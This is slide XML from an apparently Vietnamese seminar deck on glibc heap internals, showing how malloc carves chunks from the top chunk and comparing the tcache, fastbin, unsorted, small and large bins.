          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="5760720" cy="1920240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3810"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1527048"/>
            <a:ext cx="5394960" cy="22860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Heap vừa tạo — mọi bin (3.3) đều trống</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1828800"/>
            <a:ext cx="5394960" cy="141732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char *a = malloc(16);   /* nb = 0x20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char *b = malloc(16);</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char *c = malloc(16);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3566160"/>
            <a:ext cx="5760720" cy="2651760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2759"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3675888"/>
            <a:ext cx="5394960" cy="22860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_int_malloc(), nhánh use_top — malloc.c:4074–4104</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3977640"/>
            <a:ext cx="5394960" cy="2148840"/>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use_top:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  victim = av-&gt;top;      /* cắt từ top chunk, 3.1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size = chunksize (victim);</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remainder = chunk_at_offset (victim, nb);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  av-&gt;top = remainder;    /* top CO LẠI đúng nb byte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set_head (victim, nb | PREV_INUSE |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return chunk2mem (victim);  /* con trỏ malloc() trả về */</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6355080" y="1417320"/>
            <a:ext cx="5376672" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2424"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6537960" y="1572768"/>
            <a:ext cx="5029200" cy="22860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HÌNH DẠNG HEAP SAU 3 LẦN malloc(16)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="1965960"/>
            <a:ext cx="960120" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762"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chunk a</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="2788920"/>
            <a:ext cx="960120" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>mem=0x010</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7653528" y="1965960"/>
            <a:ext cx="960120" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762"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chunk b</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7653528" y="2788920"/>
            <a:ext cx="960120" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>mem=0x030</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8723376" y="1965960"/>
            <a:ext cx="960120" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762"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chunk c</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8723376" y="2788920"/>
            <a:ext cx="960120" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>mem=0x050</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9793224" y="1965960"/>
            <a:ext cx="1828800" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762"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TOP CHUNK</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9793224" y="2788920"/>
            <a:ext cx="1828800" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>top=0x060</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6537960" y="3200400"/>
            <a:ext cx="5029200" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0x20 byte / chunk, liền nhau — mỗi malloc() dịch av-&gt;top tới ngay sau phần vừa cắt. (Viền nét đứt = sơ đồ minh hoạ, không phải layout byte chính xác như mục 4-c.)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6355080" y="4617720"/>
            <a:ext cx="5376672" cy="1600200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4571"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6537960" y="4782312"/>
            <a:ext cx="5010912" cy="13258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chemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>a, b, c liền kề từng 0x20 byte — không phải glibc "biết" sẽ có 3 lần gọi, use_top chỉ luôn cắt từ av-&gt;top hiện tại</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="700"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Top không còn đủ nb + MINSIZE mới xin thêm bộ nhớ từ OS (sysmalloc, brk/mmap) — seminar không đi sâu bước này</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5 loại bin giữ chunk đã free</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3.3 · CHUNK KHÔNG TRẢ NGAY CHO OS MÀ VÀO BIN</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1417320"/>
                <a:gridCol w="2103120"/>
                <a:gridCol w="2331720"/>
                <a:gridCol w="1234440"/>
                <a:gridCol w="4187952"/>
              </a:tblGrid>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Bin</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tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Cấu trúc</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tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Kích thước chunk (64-bit)</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tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Thứ tự</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tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Đặc điểm chính</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r>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>tcache</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liên kết đơn, riêng mỗi thread</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 </a:t>
                      </a:r>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1250" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                          <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>0x410</a:t>
                      </a:r>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1250" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t> (dữ liệu ≤ 1032 B)</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LIFO</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tối đa 7 chunk/bin; không cần lock; có key (2.29+), safe-linking (2.32+)</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50" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>fastbin</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liên kết đơn</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 </a:t>
                      </a:r>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1250" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                          <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>0x80</a:t>
                      </a:r>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1250" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t> (dữ liệu ≤ 120 B)</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LIFO</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không coalesce; khi free chỉ so trùng với phần tử đầu danh sách</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50" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>unsorted bin</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liên kết đôi</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chunk còn lại, chưa phân loại</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FIFO</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trạm trung chuyển khi free; nguồn leak địa chỉ libc phổ biến</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50" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>smallbin</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liên kết đôi</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&lt; </a:t>
                      </a:r>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1250" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                          <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>0x400</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FIFO</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mỗi bin ứng với một kích thước cố định</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50" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>largebin</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liên kết đôi</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 </a:t>
                      </a:r>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1250" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                          <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>0x400</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size giảm dần</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tối ưu cho best-fit</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bl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4663440"/>
            <a:ext cx="3605784" cy="1554480"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4706"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="482803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THỨ TỰ KHI FREE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5120640"/>
            <a:ext cx="3240024" cy="98755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tcache trước; bin đầy (7 chunk) mới xuống fastbin; còn lại vào unsorted bin rồi phân loại về small/large</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4291584" y="4663440"/>
            <a:ext cx="3605784" cy="1554480"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4706"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4474464" y="482803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TCACHE RA ĐỜI</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4474464" y="5120640"/>
            <a:ext cx="3240024" cy="98755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glibc 2.26, để giảm tranh chấp khóa giữa các thread vốn dùng chung arena</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8125968" y="4663440"/>
            <a:ext cx="3605784" cy="1554480"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4706"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8308848" y="482803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TẮT TCACHE KHI NGHIÊN CỨU</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8308848" y="5120640"/>
            <a:ext cx="3240024" cy="98755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Chạy binary với </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>GLIBC_TUNABLES</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>glibc.malloc.tcache_count=0</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="12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Vị trí các bin trong một lần malloc()</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3.3 · __libc_malloc → _int_malloc, malloc.c:3520</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="1726692" cy="3291840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4237"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="1508760"/>
            <a:ext cx="1452372" cy="502920"/>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1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
